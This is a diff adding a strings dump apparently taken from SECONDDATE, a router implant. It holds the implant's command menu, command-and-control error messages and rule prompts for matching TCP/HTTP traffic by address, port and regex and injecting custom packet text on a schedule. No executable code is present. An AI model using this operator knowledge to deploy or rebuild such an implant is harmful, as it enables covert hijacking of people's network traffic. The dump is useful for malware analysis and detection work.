@@ -1,0 +1,220 @@
+Command:                              Description
+--------                              --------------------------------------
+clearlog                              Clears entire translation table.
+                                      All rules must be disabled first.
+disable [rulenum]                     Disables redirection/survey rule.
+enable [rulenum]                      Enables redirection/survey rule.
+help or ?                             Shows this command summary.
+ping                                  Tests for connectivity to sd module.
+quit or exit                          Exits.
+rule [rulenum] [opts ...]             Sets options for a rule.
+                                      where opts is one or more of the following options
+                                      (defaults are shown in parentheses):
+                                      [--srcaddr addr(0)] [--srcmask mask(255.255.255.255)]
+                                      [--dstaddr addr(0)] [--dstmask mask(255.255.255.255)]
+                                      [--protocol prot(6/TCP)] [--srcport port(0)] [--dstport port(0)]
+                                      [--mininterval(60)] [--maxinjections(5)] [--injectwindow(0)]
+                                      [--checkhttp (default) | --nocheckhttp]
+                                      [--checkregex (default) | --nocheckregex]
+                                      [--tcpflag (FIN ACK) URG | ACK | PSH | RST | SYN | FIN ]
+                                      [--regexfile <filename>] [--injectfile <filename>
+getinfo                               Show generic implant information.
+showrule [--all | rulenum]            Shows contents of enabled rules.
+                                      All rules are shown if the --all flag is used.
+getlog [--log logfile ] [entrynum]    Shows contents of the log.
+                                      Starts at entry entrynum if provided or 0 otherwise.
+                                      Optionally writes its output to logfile.
+uninstall                             Uninstalls (unloads) sd module from router.
+                                      Requires sd to be reinstalled after this command
+                                      for future operations using sd.
+Configuring min interval, max injections and inject window examples:
+All times are input in seconds
+	10 injections per 2 hour window until manually disabled and injections are 5 minutes apart.
+		min interval = 300, max injections = 10, inject window = 7200
+	10 injections then disable and injections are 5 minutes apart
+		min interval = 300, max injections = 10, inject window = 0
+	inject every 5 minutes until manually disabled
+		min interval = 300, max injections = 0, inject window = 0
+	The default is 5 injections the disable and injections are 60 seconds apart
+%a, %d %b %Y %H:%M:%S %z
+CnC: unable to send request
+CnC: bad response from send() call
+CnC: unable to receive response
+CnC: bad response from recv() call
+CnC: invalid magic value in response.  Retrying ...
+CnC: checksum error in request/response.  Retrying ...
+CnC: failed to properly decrypt response.  Retrying ...
+CnC: sequence number mismatch in request/response.  Retrying ...
+CnC: timedout waiting for a response.  Retrying ...
+CnC: failed to receive a valid response after %d retries.
+SECONDDATE: unable to malloc memory for RC6 Key expansion.
+       %s <target address> [target port]
+SECONDDATE: %s is invalid IP address.
+SECONDDATE: %s is invalid port number.
+SECONDDATE: unable to open socket
+SECONDDATE: bad response from socket() call
+SECONDDATE: unable to bind socket
+SECONDDATE: bad response from bind() call
+SECONDDATE: ambiguous command.  Try again.
+SECONDDATE: command failed with error code %d.
+Current number of active log entries is %d
+Current number of active rules is %d
+SECONDDATE: all rules must be disabled before clearing the log.
+SECONDDATE: mininterval value must be >= 60.
+SECONDDATE: maxinjections value must be >= 0.
+SECONDDATE: injectwindow value must be >= 0.
+SECONDDATE: parse error in srcaddr option.
+SECONDDATE: parse error in srcmask option.
+SECONDDATE: parse error in dstaddr option.
+SECONDDATE: parse error in dstmask option.
+SECONDDATE: parse error in protocol option.
+SECONDDATE: parse error in srcport option.
+SECONDDATE: parse error in dstport option.
+SECONDDATE: unable to determine regex file length
+SECONDDATE: regex is too long. Max size = %u.
+SECONDDATE: error reading regex file.
+SECONDDATE: unable to open regex file.
+SECONDDATE: unable to determine inject file length
+SECONDDATE: inject is too long. Max size = %u.
+SECONDDATE: error reading inject file.
+SECONDDATE: unable to open inject file.
+SECONDDATE: TCP, UDP or 0 (any) are the only valid protocol options.
+SECONDDATE: REGEX pattern checking requires a pattern file.
+SECONDDATE: Usage: rule [rulenum] [--srcaddr addr] [--srcmask mask] [--dstaddr addr] [--dstmask mask] [--protocol prot] [--srcport port] [--dstport port] [--regexfile file] [--injectfile file] [--mininterval] [--maxinjections] [--injectwindow] [--checkhttp|--nocheckhttp] [--checkregex|--nocheckregex] [--tcpflag SYN|ACK|URG|PSH|RST|FIN] 
+SECONDDATE: You must choose a rule number between 1 and %d
+SECONDDATE: Invalid rule number.  Try again.
+SECONDDATE: Invalid IP address.  Try again.
+Source address (defaults to 'any'): 
+SECONDDATE: Invalid mask.  Try again.
+Source address mask (defaults to 255.255.255.255): 
+Destination address (defaults to 'any'): 
+Destination address mask (defaults to 255.255.255.255): 
+Valid protocol numbers are the following:
+Protocol Number (defaults to protocol 6): 
+SECONDDATE: Invalid Protocol number.  Try again.
+For TCP or UDP, please enter port numbers.  0 implies 'any' port.
+SECONDDATE: Invalid port number.  Try again.
+Source Port Number (defaults to 'any'): 
+Destination Port Number (defaults to 'any'): 
+	The default is 5 injections the disable and injections are 60 seconds apart
+Enter minimum interval between injections (defaults to 60): 
+SECONDDATE: minimum interval must be greater than 60 seconds
+SECONDDATE: Invalid max injections.  Try again.
+Enter max injections per window (defaults to 5): 
+SECONDDATE: Invalid inject window.  Try again.
+Enter injection window (defaults to 0): 
+SECONDDATE: You must answer y or n.  Try again.
+Would you like to perform HTTP GET checks (y/n)? (defaults to y): 
+Would you like to use a custom regular expression (y/n)? (defaults to y): 
+Would you like to change the TCP flags on the inject packet tosomething other the FIN ACK PSH(y/n)? (defaults to n): 
+Would you like set the URG flag? (defaults to n): 
+Would you like set the ACK flag? (defaults to n): 
+Would you like set the PSH flag? (defaults to n): 
+Would you like set the RST flag? (defaults to n): 
+Would you like set the SYN flag? (defaults to n): 
+Would you like set the FIN flag? (defaults to n): 
+SECONDDATE: Error opening pattern file.  Try again.
+SECONDDATE: Unable to determine file size.  Try again.
+SECONDDATE: Pattern too long.  Try again.
+Please provide the filename containing the regular expression: 
+SECONDDATE: Error opening inject file. %s Try again.
+SECONDDATE: Inject text too long.  Try again.
+SECONDDATE: only read %d of %d bytes.  Try again.
+Please provide the filename containing the inject text: 
+You must disable the rule before setting it.
+The Custom Regular Expression did not compile
+SECONDDATE: Usage: disable [rulenum]
+SECONDDATE: Invalid rule number.
+SECONDDATE: Usage: enable [--delay h:m:s] [rulenum]
+SECONDDATE: Usage getlog [--log=logfile] entrynum
+%s.%04d_%02d_%02d_%02d:%02d:%02d
+SECONDDATE: unable to open log file %s
+Index	Src Address	Dest Address	Prot	Src Port	Dst Port	Age(secs) 	rule
+-----	-----------	------------	----	--------	--------	----------	------
+SECONDDATE: Usage showrule [--all | rulenum]
+$Revision: 174 $
+1.1.1.1
+Release: %s
+Usage: %s [-v]
+Which rule number [1 - %d]?: 
+SECONDDATE> 
+SECONDDATE: unknown command
+getinfo
+SecondDate Version: %08X
+clearlog
+NULL
+NONE
+SECONDDATE: bad TCP flag.
+maxinjections
+255.255.255.255
+6	TCP
+17	UDP
+0	all protocols
+setting checkpattern to 0
+disable
+enable
+getlog
+Logging entry %d to %s
+%-15.15s	
+%8d	
+%10u	
+stopping at curr = %d
+uninstall
+showrule
+Rule:           %d
+quit
+[#] 
+ping
+Command aborted.
+--all
+--dstaddr
+--injectwindow
+--mininterval
+--nocheckhttp
+--protocol
+--srcaddr
+--tcpflag
+--checkhttp
+--dstmask
+--injectfile
+--maxinject
+--nocheckregex
+--regexfile
+--srcmask
+--checkregex
+--dstport
+--srcport
+{Dyes
+Enabled:        %s
+Src Addr:       %s
+Src Mask:       %s
+Dst Addr:       %s
+Dst Mask:       %s
+Protocol:       %d
+Src Port:       %d
+Dst Port:       %d
+Min Interval:   %u
+Max Inject:     %u
+Inject Window:  %u
+Inject Length:  %u
+URG 
+--- 
+TCP Flags:      %s
+ACK 
+PSH 
+RST 
+SYN 
+FIN 
+Check HTTP:     %s
+Custom Regex:   %s
+Next Injection Time:    %u
+Current Injections:   %u
+Total Injections:  %u
+(NULL)
+Injection Window End Time:     %u
+Regex Pattern:
+[ BEGIN ]
+[ END ]
+Inject Text:
+[ BEGIN ]
+[ END ]
